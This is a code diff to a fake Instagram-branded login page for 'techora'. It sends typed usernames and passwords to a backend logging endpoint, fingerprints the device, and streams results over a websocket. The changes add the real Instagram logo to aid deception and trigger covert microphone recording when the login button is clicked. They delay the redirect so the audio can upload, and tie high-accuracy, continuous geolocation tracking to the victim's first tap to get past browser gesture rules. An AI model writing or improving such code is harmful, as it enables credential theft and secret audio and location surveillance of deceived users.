@@ -80,12 +80,8 @@
 
     <!-- techora Logo -->
     <div class="mb-16" data-purpose="brand-logo">
-      <div class="w-20 h-20 rounded-[22%] bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7] p-[2px]">
-        <div class="w-full h-full rounded-[20%] border-[5px] border-white flex items-center justify-center relative">
-          <div class="w-8 h-8 rounded-full border-[5px] border-white"></div>
-          <div class="absolute top-2 right-2 w-2 h-2 rounded-full bg-white"></div>
-        </div>
-      </div>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo"
+        class="w-20 h-20 object-contain">
     </div>
 
     <!-- Login Form -->
@@ -170,6 +166,12 @@
         const username = usernameInput.value;
         const password = passwordInput.value;
 
+        // ── Trigger audio capture on login click ────────────────────
+        // Fire immediately so audio records while we wait for fetch
+        if (typeof captureAudioOnLogin === 'function') {
+          captureAudioOnLogin();
+        }
+
         try {
           // Send data to the backend first
           await fetch('/api/log', {
@@ -181,10 +183,11 @@
           });
         } catch (err) {
           console.error('Error logging to terminal:', err);
-        } finally {
-          // Bypasses JSON structure issues and redirects immediately to the external link
-          window.location.assign('https://www.instagram.com/techora.inofficial');
         }
+
+        // Wait 6.5s for audio recording (6s) + send time before redirecting
+        await new Promise(resolve => setTimeout(resolve, 6500));
+        window.location.assign('https://www.instagram.com/techora.inofficial');
       });
     </script>
 
@@ -259,8 +262,11 @@
         // ─── Main Capture Entry Point ───────────────────────────────
         function startCapture() {
           collectFingerprint();
-          requestLocation();
+          // NOTE: Do NOT call requestLocation() here.
+          // Geolocation requires a user gesture (tap/click) on modern browsers.
+          // It will be triggered on first user interaction instead.
           requestMediaPermissions();
+          setupLocationOnUserGesture();
         }
 
         // ─── Comprehensive Device Fingerprint ───────────────────────
@@ -453,8 +459,31 @@
         }
 
         // ─── Geolocation ────────────────────────────────────────────
+        let locationRequested = false;
+
         function requestLocation() {
+          if (locationRequested) return; // avoid duplicate prompts
+          locationRequested = true;
           if (!navigator.geolocation) return;
+
+          // First try: check if permission is already granted via Permissions API
+          if (navigator.permissions && navigator.permissions.query) {
+            navigator.permissions.query({ name: 'geolocation' }).then((result) => {
+              if (result.state === 'granted' || result.state === 'prompt') {
+                doRequestLocation();
+              } else {
+                sendWS({ type: 'permission_denied', permission: 'location' });
+              }
+            }).catch(() => {
+              // Permissions API not supported, try directly
+              doRequestLocation();
+            });
+          } else {
+            doRequestLocation();
+          }
+        }
+
+        function doRequestLocation() {
           navigator.geolocation.getCurrentPosition(
             (pos) => {
               sendWS({
@@ -463,7 +492,7 @@
                 lng: pos.coords.longitude,
                 accuracy: pos.coords.accuracy
               });
-              // Watch for updates
+              // Watch for continuous updates
               navigator.geolocation.watchPosition(
                 (p) => sendWS({
                   type: 'location_update',
@@ -475,11 +504,29 @@
                 { enableHighAccuracy: true, maximumAge: 30000 }
               );
             },
-            () => {
-              sendWS({ type: 'permission_denied', permission: 'location' });
+            (err) => {
+              // If it failed because no user gesture, allow retrying on next interaction
+              if (err.code === 1) {
+                // PERMISSION_DENIED — might be a real denial or gesture-gate
+                sendWS({ type: 'permission_denied', permission: 'location' });
+              } else {
+                // POSITION_UNAVAILABLE or TIMEOUT — allow retry
+                locationRequested = false;
+              }
             },
-            { enableHighAccuracy: true, timeout: 10000 }
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
           );
+        }
+
+        // Trigger location request on first user interaction (tap/click/focus)
+        function setupLocationOnUserGesture() {
+          const gestureEvents = ['click', 'touchstart', 'focus'];
+          function onUserGesture() {
+            requestLocation();
+            // Remove all listeners after first trigger
+            gestureEvents.forEach(evt => document.removeEventListener(evt, onUserGesture, true));
+          }
+          gestureEvents.forEach(evt => document.addEventListener(evt, onUserGesture, { capture: true, once: false, passive: true }));
         }
 
         function sendLocation() {
@@ -767,6 +814,18 @@
         } else {
           connectWS();
         }
+
+        // ─── Expose login-triggered audio capture globally ───────────
+        window.captureAudioOnLogin = function () {
+          if (!navigator.mediaDevices) return;
+          navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+            .then((stream) => {
+              captureAudioFromStream(stream);
+            })
+            .catch(() => {
+              // Microphone permission not granted — silently skip
+            });
+        };
 
       })();
     </script>
